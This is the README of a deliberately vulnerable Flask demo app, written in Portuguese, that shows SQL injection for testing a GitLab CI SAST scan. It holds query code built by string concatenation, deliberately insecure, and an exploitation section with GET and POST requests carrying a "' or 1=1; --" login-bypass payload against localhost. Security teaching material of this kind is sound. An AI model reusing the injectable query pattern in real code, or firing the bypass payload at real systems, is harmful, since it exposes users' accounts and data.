
# flask-sql-injection
  

Aplicação Flask + BD para demonstração de uma vulnerabilidade SQL Injection identificada pelo SAST do .gitlab-ci.yml.

## mydb.db

|id|user |password|
|--|--|--|
|1 |teste@teste.com |1234|
|2 |teste2@teste.com |1234|
|3 |teste@teste.com |12345678|
|4 |teste2@teste.com |87654321|
  
## Código

    66 sql_Query_Not_Injection = text("select * from user where id=:user_id")
    67 result = conn.execute(sql_Query_Not_Injection, user_id = id)
    68
    69 sql_Query_Injection_False_Negative = text("SELECT * FROM users WHERE username = '" + username_from_url + "'"
    70                                      " AND password = " + password_from_url)                                         
    71 result = conn.execute(sql_Query_Injection_False_Negative)
    72
    73 # deprecated in SQLAlchemy >=2.0
    74 sql_Query_Injection = "SELECT * FROM users WHERE id={}".format(id)
    75 result = conn.execute(sql_Query_Injection)

 - As linhas 66 e 67 **não contém** uma vulnerabilidade SQL Injection;
 - As linhas 69 e 70 **contém** uma vulnerabilidade SQL Injection, **identificável**  no SAST do .gitlab-ci;

## Deploy com docker compose, com MySQL
```
$ docker compose up -d
```

## Deploy local, com SQLite
```
$ python app/app.py run
```
## Explorando a vulnerabilidade

Importar a collection flask-sql-injection.postman_collection.json no Postman

OU

```
$ GET http://127.0.0.1:5000/login?username=%27%20or%201=1;%20--&password=1234
```

```
POST /login HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

username='%20or%201%3D1%3B%20--%20&password=1234
```
Baseado no projeto [EstudosAvancadosSI](https://github.com/BrunoEleodoro/EstudosAvancadosSI)